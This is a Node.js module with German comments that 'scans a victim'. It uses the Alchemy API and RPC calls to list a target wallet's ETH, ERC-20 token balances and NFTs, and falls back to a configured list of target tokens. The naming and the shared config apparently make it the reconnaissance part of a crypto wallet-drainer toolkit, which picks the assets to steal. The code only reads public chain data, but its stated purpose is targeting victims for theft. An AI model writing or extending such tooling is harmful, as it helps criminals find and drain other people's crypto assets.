// Auto-Scanner: findet alle Token + NFTs eines Opfers automatisch
// Nutzt Alchemy Token API + RPC Enumeration, kein manuelles Eintragen nötig
const { ethers } = require('ethers');
const fs = require('fs');
const path = require('path');

const cfg = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'config.json'), 'utf8'));

async function scanVictim(victim, chainId = 1){
  const chain = (cfg.chains || []).find(c=>c.chainId===chainId) || { rpcUrl: cfg.rpcUrl, alchemyKey: cfg.alchemyKey };
  const provider = new ethers.providers.JsonRpcProvider(chain.rpcUrl);
  const out = { victim, chainId, eth: "0", tokens: [], nfts: [] };

  // ETH
  try{ out.eth = (await provider.getBalance(victim)).toString(); }catch(e){}

  // Alchemy: alle Token-Balances
  try{
    if(chain.alchemyKey){
      const url = `https://eth-mainnet.g.alchemy.com/v2/${chain.alchemyKey}`;
      const r = await fetch(url, {
        method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify({ jsonrpc:"2.0", id:1, method:"alchemy_getTokenBalances", params:[victim, "DEFAULT_TOKENS"] })
      });
      const j = await r.json();
      for(const t of (j.result?.tokenBalances||[])){
        const bal = BigInt(t.tokenBalance||"0x0");
        if(bal > 0n) out.tokens.push({ contract: t.contractAddress, balance: bal.toString() });
      }
      // NFTs
      const r2 = await fetch(url, {
        method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify({ jsonrpc:"2.0", id:1, method:"alchemy_getNftsForOwner", params:[victim] })
      });
      const j2 = await r2.json();
      for(const n of (j2.result?.ownedNfts||[])){
        out.nfts.push({ contract: n.contract?.address, tokenId: n.tokenId, name: n.title });
      }
    }
  }catch(e){ out.scanError = e.message; }

  // Fallback: kuratierte Liste aus config prüfen
  if(out.tokens.length === 0){
    const ERC20 = ["function balanceOf(address) view returns (uint256)"];
    for(const t of (cfg.targetTokens||[])){
      try{
        const c = new ethers.Contract(t, ERC20, provider);
        const b = await c.balanceOf(victim);
        if(!b.isZero()) out.tokens.push({ contract: t, balance: b.toString() });
      }catch(e){}
    }
  }
  return out;
}

module.exports = { scanVictim };
if(require.main === module){
  (async()=>{ console.log(JSON.stringify(await scanVictim(process.argv[2]), null, 2)); })();
}
